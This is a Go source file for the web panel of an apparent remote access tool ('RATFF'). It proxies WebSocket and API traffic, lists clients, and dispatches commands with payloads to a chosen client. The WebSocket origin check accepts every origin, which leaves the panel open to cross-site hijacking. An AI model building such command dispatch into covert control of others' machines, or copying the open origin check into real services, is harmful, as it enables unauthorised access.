package main

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"time"

	"RATFF/shared"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"golang.org/x/time/rate"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

// handleWebSocketRoot handles WebSocket at /ws (no path prefix).
func handleWebSocketRoot(c *gin.Context) {
	handleWebSocketWithPath(c, "")
}

// handleAPIClientsRoot handles /api/clients (no path prefix).
func handleAPIClientsRoot(c *gin.Context) {
	handleAPIProxyWithPath(c, "", "/api/clients")
}

// handlePathWebSocket handles /<path>/ws.
func handlePathWebSocket(c *gin.Context) {
	pathPassword := c.Param("pathPassword")
	c.SetCookie("path_prefix", pathPassword, 3600, "/", "", false, true)
	handleWebSocketWithPath(c, pathPassword)
}

// handlePathAPIClients handles /<path>/api/clients.
func handlePathAPIClients(c *gin.Context) {
	pathPassword := c.Param("pathPassword")
	c.SetCookie("path_prefix", pathPassword, 3600, "/", "", false, true)
	handleAPIProxyWithPath(c, pathPassword, "/api/clients")
}

// handleWebSocketWithPath upgrades HTTP to WebSocket with path password.
func handleWebSocketWithPath(c *gin.Context, pathPassword string) {
	wsURL := buildWSURL(pathPassword)
	conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
	if err != nil {
		log.WithError(err).Error("WebSocket dial failed")
		c.JSON(500, gin.H{"error": "websocket connection failed"})
		return
	}
	defer conn.Close()

	clientConn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.WithError(err).Error("WebSocket upgrade failed")
		return
	}
	defer clientConn.Close()

	go func() {
		for {
			_, data, err := clientConn.ReadMessage()
			if err != nil {
				return
			}
			if err := conn.WriteMessage(websocket.TextMessage, data); err != nil {
				return
			}
		}
	}()

	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			return
		}
		if err := clientConn.WriteMessage(websocket.TextMessage, data); err != nil {
			return
		}
	}
}

// handleAPIProxyWithPath proxies API requests with path password.
func handleAPIProxyWithPath(c *gin.Context, pathPassword, subPath string) {
	token, _ := c.Cookie("auth_token")
	if token == "" {
		c.Redirect(302, "/login")
		return
	}

	apiURL := buildAPIURL(pathPassword, subPath)

	var req *http.Request
	var err error

	if c.Request.Method == "POST" {
		req, err = http.NewRequest("POST", apiURL, c.Request.Body)
		req.Header.Set("Content-Type", "application/json")
	} else {
		req, err = http.NewRequest("GET", apiURL, nil)
	}

	if err != nil {
		log.WithError(err).Error("Create request failed")
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.WithError(err).Error("Proxy request failed")
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.WithError(err).Error("Read response body failed")
		c.JSON(500, gin.H{"error": "failed to read response"})
		return
	}
	c.Data(resp.StatusCode, "application/json", body)
}

// buildAPIURL constructs the full API URL with optional path prefix.
func buildAPIURL(pathPrefix, endpoint string) string {
	if pathPrefix != "" {
		return cfg.APIBaseURL + "/" + pathPrefix + endpoint
	}
	return cfg.APIBaseURL + endpoint
}

// buildWSURL constructs the full WebSocket URL with optional path prefix.
func buildWSURL(pathPrefix string) string {
	baseURL := cfg.WsURL
	if baseURL == "" {
		baseURL = "ws://localhost:6341"
	}

	if pathPrefix != "" {
		return baseURL + "/" + pathPrefix + "/ws"
	}
	return baseURL + "/ws"
}

// handleExecCommand sends a command to a client and waits for the response.
func handleExecCommand(c *gin.Context) {
	var req struct {
		ClientID string                 `json:"client_id" binding:"required"`
		Command  string                 `json:"command" binding:"required"`
		Payload  map[string]interface{} `json:"payload"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[req.ClientID] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	msg := shared.NewMessage(shared.MsgCommand, shared.CommandType(req.Command), req.ClientID, req.Payload)
	data, err := json.Marshal(msg)
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, req.ClientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	token, pathPrefix := getAuthInfo(c)

	urlPathPrefix := c.Param("pathPassword")
	if urlPathPrefix != "" {
		pathPrefix = urlPathPrefix
		c.SetCookie("path_prefix", pathPrefix, 3600, "/", "", false, true)
	}

	wsConnMu.Lock()
	if wsConn == nil {
		newConn, err := connectWS(pathPrefix)
		if err != nil {
			wsConnMu.Unlock()
			pendingMu.Lock()
			delete(pendingCmd, req.ClientID)
			pendingMu.Unlock()
			c.JSON(500, gin.H{"error": "websocket not connected: " + err.Error()})
			return
		}
		wsConn = newConn
		go listenResponses(wsConn)
		log.Info("Connected to WebSocket server")
	}
	wsConnMu.Unlock()

	commandURL := buildAPIURL(pathPrefix, "/api/command")

	httpReq, err := http.NewRequest("POST", commandURL, bytes.NewBuffer(data))
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, req.ClientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	httpReq.Header.Set("Content-Type", "application/json")
	if token != "" {
		httpReq.Header.Set("Authorization", "Bearer "+token)
	}

	resp, err := http.DefaultClient.Do(httpReq)
	if err != nil {
		pendingMu.Lock()
		delete(pendingCmd, req.ClientID)
		pendingMu.Unlock()
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	defer resp.Body.Close()

	select {
	case msg := <-ch:
		c.JSON(200, gin.H{"status": "completed", "response": msg})
	case <-time.After(10 * time.Second):
		pendingMu.Lock()
		delete(pendingCmd, req.ClientID)
		pendingMu.Unlock()
		c.JSON(504, gin.H{"error": "command timed out"})
	}
}

// getAuthInfo extracts auth_token and path_prefix from cookies.
func getAuthInfo(c *gin.Context) (token, pathPrefix string) {
	token, _ = c.Cookie("auth_token")
	pathPrefix, _ = c.Cookie("path_prefix")
	return
}

// rateLimitMiddleware creates a middleware that limits requests to 50 per second.
func rateLimitMiddleware() gin.HandlerFunc {
	limiter := rate.NewLimiter(rate.Every(time.Second), 50)

	return func(c *gin.Context) {
		if !limiter.Allow() {
			c.JSON(429, gin.H{"error": "too many requests"})
			c.Abort()
			return
		}
		c.Next()
	}
}
